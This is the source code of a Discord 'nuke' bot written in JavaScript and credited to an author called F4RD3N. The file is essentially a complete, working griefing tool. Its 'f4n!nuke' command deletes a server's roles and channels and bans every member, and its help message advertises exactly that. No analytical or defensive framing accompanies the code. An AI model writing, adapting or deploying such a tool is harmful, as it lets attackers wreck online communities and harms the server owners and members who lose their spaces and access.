const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () => {
    console.log("This bot has been developed by F4RD3N.")
    console.log(`${nuke.user.tag} is online.`);
    nuke.user.setPresence({ game: { name: `F4 Bot` }, type: 0 }); 
});

nuke.on("message", async (msg) => {



    if (msg.content.toLowerCase().startsWith("f4n!" + "nuke")) {
        msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
        msg.guild.channels.deleteAll();
        msg.guild.members.tap(member => member.ban("Idiot Ban"));
    }
    if (msg.content.toLowerCase().startsWith("f4n!" + "help")) {
        msg.author.send({
            embed: {
                color: 0xff0000,
                author: { name: "Nope" },
                description: "f4n!nuke - Bans all members & deletes all roles and channels\n\nFor any help contact Pop#3459"
            }
        })
    }
});

nuke.login("Token Here"); 
